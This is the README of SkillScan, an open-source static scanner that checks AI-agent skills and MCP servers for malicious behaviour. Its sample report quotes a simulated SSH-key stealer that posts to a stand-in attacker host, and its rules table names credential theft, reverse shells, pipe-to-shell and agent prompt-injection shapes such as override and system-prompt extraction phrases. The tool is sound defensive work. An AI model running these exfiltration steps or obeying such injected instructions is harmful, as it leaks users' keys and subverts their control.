# SkillScan by RakTikoo — scan an AI agent skill or MCP server before you install it

Scan an AI-agent skill or MCP server before you install it.

![SkillScan scanning two sample skills — a malicious one is BLOCKed, a clean one PASSes](demo.gif)

AI-agent skills and MCP servers run on your machine, with your agent's
permissions — your files, your accounts, your keys. SkillScan reads a
skill folder *before* you install it and gives you one plain-English
verdict — **BLOCK**, **CAUTION**, or **PASS** — from deterministic rules.
By default no LLM is involved: the same folder always gets the same
answer, and every finding points at the exact rule, file, and line.
An optional LLM review mode (`--llm`, off by default) can *add*
findings on top — it can never remove or change them; see
[Modes](#modes-offline-default-and-llm-review-opt-in).

SkillScan is free and open source (MIT). There is no hosted tier and no
paid version — the whole tool lives in this repository.

**Install in one step:** `pip install git+https://github.com/RakTikoo/skillscan`
(Python 3.10+, zero dependencies), then run `skillscan <folder>`.
Full options are under [Install / usage](#install--usage).

**First contribution?** Start with a [good first issue](https://github.com/RakTikoo/skillscan/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22).

## What does a scan look like?

```console
$ python3 -m skillscan samples/bad/ssh-stealer

SkillScan report for: .../samples/bad/ssh-stealer

Scanned 2 file(s); skipped 0.

Findings (5):
  [CAUTION] HOME_OR_SYSTEM_WRITE — steal.py:12
      Resolves or touches paths in the home directory or system locations (Path.home, expanduser, $HOME, /etc, /usr/local) instead of staying inside its own skill folder.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] SSH_CREDENTIAL_READ — steal.py:12 (x2)
      Reads SSH credential material (~/.ssh / private key files). A skill
      has no legitimate reason to read your SSH keys.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] EXFIL_COMBINATION — steal.py:14
      This skill both reads credential / private material AND has a way to
      send data out over the network. That combination is the exfiltration
      shape, whatever either half claims to be for.
  [CAUTION] NETWORK_ACCESS — steal.py:14
      Makes network requests. Network access is common in honest skills, but it is also the channel used to send your data away — check where it talks to.
      > requests.post("https://evil.example.invalid/collect", data=key_text)
  [BLOCK] NETWORK_SEND_DATA — steal.py:14 (x2)
      Sends data out over the network (HTTP POST/PUT, curl -d, a Request with a body). Combined with any local file access this is the classic exfiltration shape.
      > requests.post("https://evil.example.invalid/collect", data=key_text)

VERDICT: BLOCK
```

(That sample is a simulated stealer used only for testing — see
"Test corpus" below. It is never executed, only scanned.)

## Install / usage

Pure Python 3 standard library, no dependencies. Install it as a
command with pip, straight from GitHub:

```bash
pip install git+https://github.com/RakTikoo/skillscan
skillscan <path-to-skill-folder>
```

(Please use the GitHub route: the `skillscan` name on PyPI belongs to
a different tool by another author.)

With pipx (isolated) or uv:

```bash
pipx install git+https://github.com/RakTikoo/skillscan
uv tool install git+https://github.com/RakTikoo/skillscan
```

From the release wheel (no git needed):

```bash
pip install https://github.com/RakTikoo/skillscan/releases/download/v0.10.0/skillscan-0.10.0-py3-none-any.whl
```

Checksums for the release files are in the `SHA256SUMS` file attached to
the v0.10.0 release.

With Homebrew (macOS/Linux):

```bash
brew tap RakTikoo/tools
brew install RakTikoo/tools/skillscan
```

With Scoop (Windows):

```powershell
scoop bucket add RakTikoo https://github.com/RakTikoo/scoop-bucket
scoop install skillscan
```

Or clone the repo and run it in place:

```bash
git clone https://github.com/RakTikoo/skillscan
cd skillscan

python3 -m skillscan <path-to-skill-folder>              # text report
python3 -m skillscan <path-to-skill-folder> --format md   # Markdown report
python3 -m skillscan <path-to-skill-folder> --format json # machine-readable
python3 -m skillscan <path-to-skill-folder> --format sarif # SARIF 2.1.0 (toolchains)
python3 -m skillscan https://github.com/<owner>/<repo>   # clone + scan a repo
python3 skillscan.py <path-to-skill-folder>               # shim, same thing
python3 -m skillscan <path-to-skill-folder> --llm         # + optional LLM review (see Modes)
python3 -m skillscan <path-to-skill-folder> --pin pin.json      # fingerprint it (see Change watch)
python3 -m skillscan <path-to-skill-folder> --check-pin pin.json # later: what changed?
python3 -m skillscan <path-to-skills-folder> --combine          # judge a folder of skills as a set
python3 -m skillscan <path-to-skill-folder> --exceptions exceptions.json  # accept findings, on the record
```

Repo URLs: only `https://github.com/<owner>/<repo>` is accepted.
SkillScan shallow-clones it into a temp dir (redirect-following
disabled), scans, and deletes the clone. Requires `git` on `PATH`.
npm package folders (`package.json`) and Python package folders
(`setup.py` / `pyproject.toml`) scan like any other folder, with
extra install-time checks (see the rules table).

How scanning works:

- SkillScan walks the folder (pruning `.git`, `__pycache__`, `node_modules`,
  venvs; symlinks are **not** followed) and scans **every regular file that
  decodes as text**, whatever its extension — `.py`, `.sh`, `.ps1`, `.js`,
  extensionless scripts, all of it. UTF-16/UTF-32 files are decoded via
  their BOM instead of being skipped as "binary".
- Python files are also parsed with `ast`, with **constant folding**
  (`"id_" + "rsa"`, f-strings, `chr()` codes, `"".join(...)`, simple
  variable propagation, `Path.home() / ".s" + "sh"` joins) and
  **import-alias resolution** (`import requests as rq`, `getattr`,
  `importlib.import_module`), so splitting strings or renaming imports
  does not hide behaviour.
- Shell scripts get simple variable expansion (`K="$HOME/.ssh/id_rsa"`)
  before rules run; JS gets string-concat squeezing and `fetch` POST
  detection; JSON / MCP manifests are parsed structurally (tools that
  declare arbitrary command execution or unconstrained file reads are
  flagged as manifest findings, not text coincidences).
- Documentation (`.md`, `.txt`, `.yaml`, …) is treated as documentation:
  findings there are capped at CAUTION, and lines that *warn against* a
  pattern ("never reads `~/.ssh`") are recognised as safety documentation,
  not behaviour. Cursor rules (`.cursorrules`, `.cursor/rules/*.mdc`) and
  other agent config/instruction files get the same documentation
  treatment.
- Findings are aggregated per rule per file, with a count.
- Scanned code is **never executed** — files are only read and parsed.

**Coverage is reported, not hidden.** Every report states how many files
were scanned and which were skipped (unreadable, over the 2 MB cap,
special files like FIFOs, symlinks, binary-looking content). If anything
suspicious was skipped — or nothing was scanned at all — the verdict
cannot be a clean PASS (`SCAN_INCOMPLETE`).

### Exit codes

| Exit code | Verdict  | Meaning                                            |
|-----------|----------|----------------------------------------------------|
| 0         | PASS     | No known-bad patterns were found in what was scanned. |
| 1         | CAUTION  | Something worth a human read before installing.    |
| 2         | BLOCK    | At least one block-severity pattern was found.     |
| 3         | —        | Usage / IO error: the scanner could not run (bad path, bad flags). Deliberately distinct from BLOCK. |

The exit codes make SkillScan usable as a CI / install-time gate.

### Use as a library

The same scan is importable — `scan_folder` for one skill folder,
`scan_set` for a folder of skills (the `--combine` scan):

```python
from pathlib import Path

from skillscan import scan_folder

result = scan_folder(Path("samples/bad/ssh-stealer"))
print(result.verdict)    # "BLOCK"
print(result.exit_code)  # 2
for finding in result.findings:
    print(finding.rule, finding.file, finding.line)
```

`scan_folder` returns a `ScanResult` (verdict, findings, scanned/skipped
file counts, and a `to_dict()` for the JSON report shape). Scanned code
is never executed, exactly as with the command-line scan.

### Change watch (pin / check-pin)

A skill can be safe on the day you install it and silently
different a week later. `--pin` records a fingerprint of a
scanned folder — a hash of every entry, the verdict, the
findings, and the rule-set version — and `--check-pin`
re-scans and reports a plain diff: which entries were added,
removed, or modified, and whether the scan result changed.
`--check-pin` exit codes: **0** = no entry changed (a
rule-set version difference alone is reported, not failed —
the scanner changed, not the skill), **1** = files changed
but the scan result (verdict + findings) is identical,
**2** = the scan result changed, **3** = the pin cannot be
used. The fingerprint covers *every* entry in the folder —
regular files of every type (not only the ones the scanner
reads, because a change can arrive as a file the scanner
does not parse), directories, special files, the
permission bits on files, and symlinks (both the link
target and, when it resolves to a regular file of up to
512 MB, the content behind the link — that content is what
an agent would actually read; larger targets are recorded
by target and resolved path only). Nothing
is skipped, not even `.git` or `__pycache__`. Findings are
compared by what they say, not by line number: inserting a
comment above a flagged line is a files-changed (1), not a
scan-result change. Two honest limits: an edit that changes
neither a finding's rule, evidence, nor count on an
already-flagged file (for example swapping the host on an
already-flagged network line) also lands at exit 1, with the
file named — read the named files; and a skill that writes
runtime state (logs, caches) inside its own folder will show
those as changed entries. Keep pins *outside* the folder
they fingerprint: a pin inside it can be rewritten by the
same hand that changed the folder, and `--pin` warns when
asked to write one there.

### Combination scan (--combine)

Skills rarely run alone — an agent runs a set of them, and
a harmful capability can be split across two members: one
skill reads credentials, another sends data off the machine;
one deletes files, another installs persistence. Each is a
caution on its own; together they are the shape of an
attack. Point `--combine` at a folder whose immediate
subfolders are skills (each containing a `SKILL.md`) and it
scans every member on its own — each solo verdict reported
exactly as a solo scan would give it, never softened and
never raised — then adds a **combinations** section listing
the cross-skill capability pairs it found. Combinations are
caution-class reporting: they never produce a BLOCK, and a
pair is reported only when the two halves live in different
skills (a single skill holding both halves is the solo
scan's business, and is not double-counted here). The exit
code is the worst member's exit code. Two pair families are
checked: credential-read × network-send (with a tighter
variant — stored-credential readers pair with any network
capability at all, while a bare fetch next to a weaker
credential read does not fire), and file-delete ×
persistence.

### Exceptions with reasons (--exceptions)

Sometimes a finding is real but accepted: a dev helper that
reads the project's own example `.env`, a fixture that has
to contain a fake credential path. `--exceptions FILE`
takes a JSON file that names those findings — rule, path
glob, a human reason, and an expiry date:

```json
{"format": "skillscan-exceptions/1",
 "exceptions": [
   {"rule": "ENV_FILE_READ", "path": "tools/dev_*.py",
    "reason": "Dev-only helper; reads the project's own example .env.",
    "expires": "2027-03-01"}]}
```

Nothing is silently dropped. An excepted finding leaves
the verdict (which is recomputed from what remains) but
stays fully visible in an **Excepted findings** section —
in JSON it keeps its full shape, flagged, with the reason
and expiry attached; in SARIF it is a result carrying a
suppression whose justification is the reason. An
**expired** exception stops applying — the finding counts
again — and is itself reported; an exception that matches
nothing is reported as possibly stale. Every entry needs
all four fields (a reason-less exception is exactly what
this exists to prevent), rule ids are checked against the
scanner's own rules, and a malformed file fails the run
with a plain error (exit 3) rather than being quietly
ignored. Exceptions apply to the deterministic scan,
before the optional `--llm` review; they cannot be
combined with `--pin` / `--check-pin` or `--combine`.
Keep the file outside the scanned folder — inside, it
would be scanned as an ordinary file.

## Modes: offline (default) and LLM review (opt-in)

SkillScan has two modes, and the report always shows which one ran.

**Offline mode — the default.** Exactly what is described above:
deterministic rules only, nothing leaves your machine, no account or
key, and the same folder always gets the same verdict. If you never
pass `--llm`, this is the whole tool — its output is unchanged from
v0.6, byte for byte.

**LLM mode — `--llm`.** After the offline scan (which runs first and
is never altered), the skill's *prose* — `SKILL.md` and
markdown/docs, never code — is sent to a language model for a second
opinion on the one family deterministic rules measurably cannot
finish: **semantic steering**, prose that tells the agent to mislead
you (report success on failure, hide errors, fabricate results,
present an advert as neutral advice). Files whose prose already drew
a deterministic CAUTION are reviewed first.

```bash
export SKILLSCAN_LLM_API_KEY=<your key>
python3 -m skillscan <path-to-skill-folder> --llm
python3 -m skillscan <path-to-skill-folder> --llm --llm-model qwen/qwen3.8-27b
```

The LLM mode is **provider-neutral by design**: one
OpenAI-compatible chat-completions client, configured by exactly
three settings — `--llm-base-url`, `--llm-model`, and the key in
`SKILLSCAN_LLM_API_KEY`. There is no provider-specific code path.
The shipped defaults are simply the **reference preset** (Groq's
free tier with a small model), because that is the configuration
the mode is measured against; every other row below is the same
client pointed elsewhere. (Only for the Groq preset,
`GROQ_API_KEY` is also accepted as the key variable — it is never
sent to any other host.)

| Provider | `--llm-base-url` | `--llm-model` | Key |
|---|---|---|---|
| Groq — reference preset, free tier | `https://api.groq.com/openai/v1` (default) | `qwen/qwen3.8-27b` (default) | `SKILLSCAN_LLM_API_KEY` or `GROQ_API_KEY` |
| OpenRouter (`:free` models) | `https://openrouter.ai/api/v1` | any `:free` model id | `SKILLSCAN_LLM_API_KEY` |
| Cerebras (free tier) | `https://api.cerebras.ai/v1` | e.g. `llama3.1-8b` | `SKILLSCAN_LLM_API_KEY` |
| Gemini (OpenAI-compatible endpoint) | `https://generativelanguage.googleapis.com/v1beta/openai/` | e.g. `gemini-3.5-flash-lite` (measured on the bake-off sets) | `SKILLSCAN_LLM_API_KEY` |
| OpenAI | `https://api.openai.com/v1` | e.g. `gpt-4o-mini` | `SKILLSCAN_LLM_API_KEY` |
| Ollama (local, no account, nothing leaves your machine) | `http://localhost:11434/v1` | any pulled model, e.g. `llama3.1:8b` | any dummy value in `SKILLSCAN_LLM_API_KEY` (ignored locally) |
| LM Studio / vLLM (local server) | e.g. `http://localhost:1234/v1` | the served model id | any dummy value in `SKILLSCAN_LLM_API_KEY` (ignored locally) |

The Groq reference preset is the configuration SkillScan's
release measurements headline; the Gemini row's named model was
additionally measured on the v0.7 bake-off sets. The remaining
rows are documented provider endpoints for the same client, not
separately benchmarked configurations.

The contract:

- **Additive only.** The LLM can add findings (rule `LLM_STEERING`,
  CAUTION or BLOCK). It can never clear, downgrade, or edit an
  offline finding or the offline verdict.
- **Demarcated output.** Every format shows the offline verdict
  first, then a separate, headed **LLM review** section naming the
  model and carrying a non-determinism notice, then the
  **combined verdict** — `max(offline, llm)`, labelled with its
  source. The process exit code follows the combined verdict. In
  JSON, the offline fields are unchanged and the review is one
  added `llm` object.
- **Failure is boring.** No key, network error, timeout, or a
  response outside the required JSON schema → the LLM section
  reports **UNAVAILABLE** with the reason, the offline verdict
  stands, and the exit code is the offline one. Hard timeouts and
  size caps throughout; the key comes from the environment only
  and is never printed or logged. Cross-host redirects are
  refused, so the key is never forwarded away from the endpoint
  you configured. In JSON and SARIF the `llm` object's `verdict`
  field is `null` whenever the review was unavailable or fully
  reviewed no file — "not reviewed" is never dressed up as a
  pass. Coverage is reported per chunk: anything the review did
  not reach (file caps, chunk caps, budget) is named, never
  silently skipped.
- **The scanned prose is treated as hostile.** It is sent as
  delimited *data* under an untrusted-data framing (skills are
  written by strangers and may beg the judge to pass them), the
  judge must answer in a fixed JSON schema, and a steering claim
  is believed only when its evidence quote is verifiably present
  in the text that was sent.
- **Non-deterministic.** The same folder can get a different LLM
  opinion on a re-run. That is exactly why this mode is opt-in,
  additive, and labelled — and why the offline verdict is always
  shown separately.

Still standard library only (`urllib`), still no execution of
scanned code. Live-model measurement so far: on the benchmark's
output-manipulation family, a current-model judge lifts
BLOCK+CAUTION from 28.9% to 54.6% with zero false BLOCKs on
280 benign skills, and weak free-tier judges lift the held-out
malicious set materially (Gemini Flash-Lite 37.0% → 53.4%;
the default Qwen 34.1% → 43.2%). The benign set has since
been judged by a weak model: gemini-3.5-flash-lite reviewed
258 of 259 held-out benign skills with **0 false BLOCKs and
0 added CAUTIONs** — combined verdicts identical to offline.
The default Qwen's benign-set run was stopped by its
free-tier limit after 2 calls, so that preset's benign rate
at corpus scale remains unmeasured; its malicious-set lift
above is measured. That completes the v0.7 picture, per
model. The deterministic benchmark figures below are
offline-mode numbers and do not change.

**What remains open** (updated on every push; last updated
2026-11-19):

- **Qwen's benign set is still being priced.** The run is
  resumable and continues daily across free-tier windows until
  all 259 held-out benign skills are judged. Until it
  completes, the default preset's corpus-scale benign rate
  stays labelled unmeasured above, and the choice of default
  model stays open. Gemini's picture is complete: measured on
  both sets, 0 false BLOCKs, 0 added CAUTIONs.
- **The promotion programme is concluded: one of eight
  measured combinations shipped.** Eight CAUTION combinations
  were measured as candidate promotions to BLOCK. Only
  `INJECTION_EXECUTION` (temp-path kind) had no legitimate
  twin across three adversarial review rounds; the other
  seven are parked with their reasons recorded under Known
  limits below.
- **The broad capability pairs are priced and closed.** The
  two pairs the promotion programme left unpriced —
  `NETWORK_ACCESS` + `SHELL_SUBPROCESS` and `CHMOD_CHOWN` +
  `SHELL_SUBPROCESS` — were priced against the held-out half
  of the code-bearing benign set: they trip 8 and 9 held-out
  honest tools respectively (checksum-verified installers,
  permission fixers, freshness reporters — the canonical
  shapes of legitimate local tools), so they stay at CAUTION
  permanently. Narrowing by same file or code surface trips
  the same twins.
- **The shell-string narrowing is built, measured — and
  parked.** Requiring the execution half to be a shell string
  (`shell=True`, `os.system`, `sh -c`, JS `exec(` — not an
  argv list) priced clean on every corpus available (zero
  trips on the benign-code set and the prose corpus) and
  measured +147 malicious CAUTION → BLOCK, dead centre on
  its priced band. An independent adversarial review then
  built honest shell-string users the pricing corpora did
  not contain — build runners, an ffmpeg media tool, a
  git-hook installer, localhost test harnesses, an rsync
  backup — and the promotion blocked them wholesale: the
  mainstream honest population uses shell strings too, and
  no line-level separator exists. It does not ship. A
  48-member supplement of shell-string-user archetypes was
  added to the benign-code set so this blind spot is priced
  in from the start next time.
- **Cross-file dataflow is scoped and parked.** The
  remaining mechanical pool was 239 code-bearing malicious
  skills that PASS. A census of all 239 found the chain
  halves are not unjoined — they are absent: 209 folders
  carry no detection-relevant half at all, and no folder
  pairs complementary halves at any scope (zero downloads,
  zero credential-store reads, zero persistence writes in
  the pool's code). Honest yield is 0 (range 0–1 folders),
  and the false-positive risk is unpriceable today because
  the benign-code set has no multi-code-file members.
  Parked, not open: it is revisited only if a future census
  over a different pool first measures a real split-chain
  population. The PASS pool's signal is prose and
  instruction content, which is the LLM lane's territory.
- **A code-bearing benign set now exists, and it found real
  false BLOCKs — three defect groups are now fixed.** The
  corpus below ships benign skills as prose only, so a
  frozen internal set of hand-written benign skills with
  real code was built to test the other side (344 members,
  plus the 48-member shell-string supplement above: 392 in
  all). The scanner initially BLOCKed 52 of the original
  344, every one fully disclosed in its own SKILL.md. Three
  groups were defects in the rules — an SSH permission
  fixer blocked for "reading" keys it only chmods, plain
  curl downloads blocked as "sending data", a skill's own
  temp-folder cleanup blocked as destructive deletion — and
  the 2026-11-15 fix wave corrected all three (see "What
  the fix wave changed" below). The full set now stands at
  49 BLOCK / 286 CAUTION / 57 PASS: the 38 remaining
  original BLOCKs are stated stances, not defects (any
  persistence install blocks, disclosed or not — 22; and
  uploads to the user's own cloud still match the
  exfiltration shape — 16; the claims check is the tool for
  the second), and the supplement's 11 BLOCKs are likewise
  pre-existing stances (5 via `SHELL_OS_SYSTEM` — `os.system`
  blocks by design — and 6 via `EVAL_EXEC` on JS `exec(`).
  The zero-false-BLOCK figure below remains exact for the
  corpus it names; this set is the wider truth, stated here
  rather than smoothed over.
- **Two JS-surface items are known and queued.** A bare JS
  `spawn()` call produces no `SHELL_SUBPROCESS` finding
  (only `spawnSync` / `execSync` / `child_process.` forms are
  matched) — a coverage gap. And the `SHELL_OS_SYSTEM` line
  rule can match the text `os.system(` inside a JS string
  literal, a pre-existing false BLOCK on the JS surface
  found by the shell-string review. Both are recorded for a
  future fix wave; neither is silently widened or narrowed
  in the meantime.
- **The LLM-lane signal tests are concluded; neither
  technique shipped.** HTML-comment surfacing showed no signal
  and is closed. A purpose-consistency second pass showed a
  strong signal under a current model, but under a simpler
  model it also flagged an honest lookalike case, failing the
  benign gate set for it in advance — so it is parked, not
  shipped. The shipped `--llm` mode is unchanged; a future
  attempt needs a way to keep simpler models off the honest
  lookalike cases.
- **The gap wave shipped (v0.10.0): twelve new BLOCK rules,
  priced before they were built.** The internal comparison
  had one family where this scanner trailed badly —
  dependency / supply chain (14.4% BLOCK). Twelve
  deterministic rules whose priced forms are themselves
  the harm now BLOCK: installs resolved from a bare public
  IP, setuid/setgid chmods, sudoers and sudo-group grants,
  sitecustomize writes, scheduled-task creation, cron,
  Startup-folder and registry-Run writes, miner binaries
  in delivery position, stratum pool endpoints, and
  PowerShell fetch-and-execute. Measured: malicious BLOCK
  49.7% → 54.2%, supply chain 14.4% → 77.2%, benign
  verdicts unchanged on both benign sets. Priced and
  **not** built, because each trips mainstream honest
  tools: unpinned named-registry installs (380 benign
  trips — they stay CAUTION), unpinned VCS dependencies,
  plain-http named-host installs, custom package indexes,
  and download-then-execute chains. One built rule was
  removed after review: `dd` disk-fill is syntactically
  identical in its honest uses (disk images, swap files,
  LUKS keyfiles), so no deterministic separator exists.
  Four sibling shapes found by the red team (PowerShell
  `Register-ScheduledTask`, miner `-o host:port` endpoints
  without a stratum literal, config-file index surfaces,
  decimal/hex IPv4 and IPv6 literals) are queued as
  unpriced candidates — each needs its own pricing before
  it may BLOCK.
- **The deterministic coverage programme continues.** v0.7.1
  extended ERROR_INFO_LEAK to JavaScript/TypeScript; the
  remaining documented gaps live in
  [`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) and are
  worked from the daily audit watch.

## Use with an AI agent

This repo ships a [SKILL.md](SKILL.md) written to the Agent Skills open
standard. If your coding agent supports skills, point it at this repo and
it can install SkillScan, scan a skill or MCP server folder before you
install it, and read the verdict for you. The skill works as promised
when the repo is cloned under its real name (`skillscan`) — the standard
ties the skill's name to its folder.

## Toolchain integration

See [`docs/TOOLCHAIN.md`](docs/TOOLCHAIN.md) for the full guide:

- **GitHub Action** — the composite action in [`action.yml`](action.yml)
  (`path`, `fail-on-block`, `format`, `python-version` inputs;
  `verdict` / `exit-code` outputs) runs SkillScan in CI:

  ```yaml
  - uses: RakTikoo/skillscan@v0.10.0
    with:
      path: ./skills/my-skill        # folder to scan
      fail-on-block: "true"          # default: BLOCK fails the job
  ```

- **SARIF** — `--format sarif` emits SARIF 2.1.0 for GitHub code
  scanning, IDEs, and other static-analysis tooling.
- **pre-commit** — this repo ships a [`.pre-commit-hooks.yaml`](.pre-commit-hooks.yaml),
  so a project can gate commits on a scan of its root folder:

  ```yaml
  - repo: https://github.com/RakTikoo/skillscan
    rev: main   # the hook ships on main; pin a release tag once one carries it
    hooks:
      - id: skillscan
  ```
- **Pre-install hook** — [`hooks/pre-install-scan.sh`](hooks/pre-install-scan.sh)
  scans a folder before install and exits with the scanner's code, so
  installer wrappers can gate on it.

## Rules

76 deterministic rules. Any block-severity hit makes the verdict BLOCK;
otherwise any caution hit makes it CAUTION; otherwise PASS. Every rule
also carries an OWASP mapping (LLM Top 10 / MCP Top 10 category codes),
surfaced per finding in JSON output and in SARIF rule metadata — it is
triage metadata only and never affects the verdict.

| Rule | Severity | What it catches |
|------|----------|-----------------|
| SSH_CREDENTIAL_READ | block | Reads `~/.ssh`, `id_rsa`, `id_ed25519`, other private-key files |
| AGENT_CREDENTIAL_READ | block | Reads an AI agent's own credential store (`~/.claude/.credentials.json`, `~/.codex/auth.json`, Gemini/OpenCode auth files). Counts as credential material for EXFIL_COMBINATION and value tracking, like an SSH key |
| AGENT_CONFIG_WRITE | block | Code that writes, appends, copies or registers into a GLOBAL agent configuration — `~/.claude/CLAUDE.md`, global settings or SessionStart hooks, `~/.codex` config, a desktop app's MCP config (`claude mcp add` included), global editor/agent rules. Documentation telling the user to make the same change themselves is the same rule at caution; a skill's own project-local `.claude`/`.codex`/`.mcp` files never count |
| CLOUD_CREDENTIAL_READ | block | Reads `~/.aws`, `~/.azure`, `~/.gcloud` credential material |
| ENV_FILE_READ | block | Reads a `.env` file / loads dotenv (JS `process.env` is *not* this rule) |
| ENVIRON_SECRET_ACCESS | caution | Accesses `os.environ` / `getenv(...)` / `process.env` |
| NETWORK_ACCESS | caution | Makes network requests (`requests`, `urllib`, `httpx`, `fetch`, sockets, Node `http`/`https` module calls) |
| NETWORK_SEND_DATA | block | Sends data out (HTTP POST/PUT, GET with params/data, `curl -d`, `Request` with a body, socket send) |
| EXFIL_COMBINATION | block | Skill reads credential material **and** has a network send channel |
| SHELL_SUBPROCESS | caution | Runs programs via `subprocess` / `child_process` |
| SHELL_OS_SYSTEM | block | Runs shell strings via `os.system` / `os.popen` |
| EVAL_EXEC | block | `eval(...)` / `exec(...)` / `__import__(...)` of dynamic code |
| BASE64_OBFUSCATION | caution | Decodes base64 / encoded blobs |
| DECODE_AND_RUN | block | Decodes an encoded payload *and* executes dynamic code in the same file |
| CURL_PIPE_BASH | block | `curl ... \| bash` / `wget ... \| sh` download-and-run |
| FILE_DELETE | caution | Deletes files (`os.remove`, `os.unlink`, `shutil.rmtree`) |
| RM_RF | block | `rm -rf` recursive forced deletion (in code; in docs it is a caution) |
| PERSISTENCE | block | Crontab, `.bashrc`, LaunchAgents, systemd, autostart entries (in code; in docs it is a caution) |
| HOME_OR_SYSTEM_WRITE | caution | Resolves/touches home or system paths (`Path.home()`, `expanduser`, `$HOME`, `/etc/`, `getpwuid`, `os.homedir()`) |
| CHMOD_CHOWN | caution | Changes permissions/ownership (`chmod`, `chown`, `os.chmod`) |
| RUNTIME_PACKAGE_INSTALL | caution | Installs packages at run time (`pip install`, `npm install`, `apt-get install`, …). Documentation that merely tells the user to install a *named* package from the official registry (or the declared requirements file) is ordinary setup prose and is not flagged |
| INSTALL_FROM_URL | caution | An install command takes its package from a URL, git source, archive file, local path, or non-official package index instead of the official registry |
| DYNAMIC_IMPORT | caution | `importlib.import_module` that static review cannot resolve, or a JS `require()` of a computed, non-literal path |
| CREDENTIAL_ENUMERATION | caution | Glob/walk patterns that look like credential discovery (`id_*`, `.ssh*`) |
| MCP_UNRESTRICTED_EXEC | block | MCP manifest tool that runs arbitrary caller-supplied commands with no constraint |
| MCP_UNRESTRICTED_READ | caution | MCP manifest tool that reads arbitrary files by unconstrained path |
| MCP_SERVER_COMMAND | caution | MCP manifest that starts its server via a shell/interpreter/package-runner command |
| HARDCODED_SECRET_LIVE | block | A credential in an unambiguous live format in the code: AWS key id (`AKIA…`), GitHub token (`ghp_…`, `github_pat_…`), `sk-` API key, Slack token, or a private-key block (placeholders and marked documentation examples are not flagged) |
| HARDCODED_SECRET_GENERIC | caution | A long, high-entropy literal assigned to a password/secret/token variable (env-var references and obvious placeholders are not flagged) |
| CLOUD_METADATA_ACCESS | caution | References a cloud metadata endpoint (`169.254.169.254`, `169.254.170.2`, `metadata.google.internal`, `/latest/meta-data/`) — a source of live cloud credentials |
| CLOUD_METADATA_EXFIL | block | Touches a cloud metadata endpoint **and** reads credential material or has a network send channel |
| BROWSER_CREDENTIAL_STORE | caution | Touches browser/wallet credential storage (`Login Data`, `logins.json`, `key4.db`, `Local State`, browser profile dirs, wallet extension storage); counts as credential material for EXFIL_COMBINATION |
| REVERSE_SHELL | block | A raw socket wired to a shell (`dup2` of the socket fd, `pty.spawn`, `/dev/tcp`, or spawning `/bin/sh` alongside a socket) |
| ERROR_INFO_LEAK | caution | Returns raw exception text, a stack trace, or an environment dump as a tool result, or sends it to a remote endpoint — Python and JavaScript/TypeScript catch-block forms (logging the error and returning a plain message is not flagged) |
| PACKAGE_INSTALL_SCRIPT | caution | Package runs code at install time: an npm lifecycle script (`preinstall`/`install`/`postinstall`/`prepare`) or a `setup.py` that reaches for subprocess/network/sockets |
| PACKAGE_INSTALL_SCRIPT_EXEC | block | An install-time script downloads or executes outside code (curl/wget, pipe-to-shell, encoded payload, remote fetch) |
| DEPENDENCY_SOURCE | caution | A dependency manifest (`package.json` — including `package.template.json` templates — requirements file, `pyproject.toml`, `setup.py`, `Pipfile`) sources a dependency from outside the official registry: a git URL, a direct archive link, a local file path, or a non-official index |
| DEPENDENCY_EXECUTION | block | The skill both sources a dependency off-registry **and** runs code at install time (or declares an unrestricted-exec MCP tool) |
| DOWNLOAD_AND_RUN | block | A JS/TS file both fetches remote content **and** dynamically loads code (`require()` of a computed path, or `eval`) — the JS download-and-run dropper shape |
| PROSE_DOWNLOAD_RUN | caution | The instructions walk through a download-and-run chain by hand: fetch an archive or binary from an external source, then run/launch/install what arrived — the dropper pattern split across prose steps |
| READ_AND_DISCLOSE | caution | The folder's code reads local files **and** its instructions direct sending/uploading content to an external destination (URL, email, server, webhook) — the agent itself is the channel between the two halves |
| PROSE_FETCH_EXECUTE | caution | The instructions fetch a script or tool straight from a URL and tell the agent to run it — including anaphoric steps ("then run it") that name no file at all |
| PROSE_PIPE_INSTRUCTION | caution | The instructions (a fenced example or numbered steps) pipe a network download straight into a shell — unverified remote code execution written as documentation |
| PROSE_READ_SEND | caution | The instructions alone do both halves: read local files/folders **and** send their contents to a URL, email address or other external destination — no code needed, the agent is the channel |
| PROSE_SAFETY_BYPASS | caution | The instructions ask for a safety control (antivirus, SmartScreen, Gatekeeper, a certificate check) to be disabled or ignored so something can run |
| LURE_WITH_BYPASS | block | The folder both walks through a download-and-run chain **and** asks for a safety control to be disabled first — the classic malware-install lure shape |
| OUTPUT_MANIPULATION | caution | Instruction surfaces only (`SKILL.md`, `*.mdc`, tool-description JSON): text that steers the agent's output — hide things from the user, pretend, never refuse, or always push one product over alternatives. Discussion of such attacks (examples, warnings, "never follow instructions that say…") does not fire |
| PROSE_INSTRUCTION_EN | caution | Instruction surfaces only: English system-prompt manipulation — override/disregard prior instructions, reveal/print the system prompt, developer-mode phrasing, or a one-sentence instruction to send conversation/credential/document contents to an outside destination |
| TAINTED_SEND | block | Values read from credential material (SSH keys, token/credential files, cloud config, `.env`, browser stores) flow through the code — assignments, helpers, encoders — into a network send. Tracked by value flow, not by variable name; encoding a credential does not clean it |
| SECRET_FLOW | caution | A secret-named environment variable's value flows into a request **body**. A service's own token in its own `Authorization` header is ordinary and does not fire |
| TYPOSQUAT_SUSPECT | caution | A declared dependency name is one small edit from a very popular package name (transposed letters, swapped separator, look-alike character) — the typosquatting shape. Compared offline against curated top-package lists (`skillscan/toplists/`); known legitimate near-miss packages are never flagged |
| HIDDEN_TEXT | block / caution | Concealed text: zero-width or bidirectional control characters, Unicode Tags-block payloads (BLOCK when the decoded payload contains instruction keywords), or HTML comments carrying instruction-like content. A single zero-width joiner in ordinary multilingual text does not fire |
| NON_ENGLISH_INSTRUCTION | caution | Instruction-attack phrases in 14 other languages (override / send-the-credentials / keep-it-from-the-user shapes) — a phrase list, not language understanding. The lists are data files (`skillscan/phrases/<code>.json`): adding a language = adding one file |
| ANY_LANGUAGE_STRUCTURE | caution | An instruction surface in ANY language pairs a private credential store (`~/.ssh`, `~/.aws`, a `.env` file, a browser credential store) with an outbound destination (URL, IP, email, curl/wget, webhook). Normal integration guides (your own token → the service's API URL) and safety warnings do not fire |
| MARKDOWN_CONCEALMENT | caution | Content hidden from a rendered view (display:none, visibility:hidden, white-on-white, off-screen positioning, hidden attribute) that contains instruction-grade wording. A plain `<details>` disclosure block does not fire on its own |
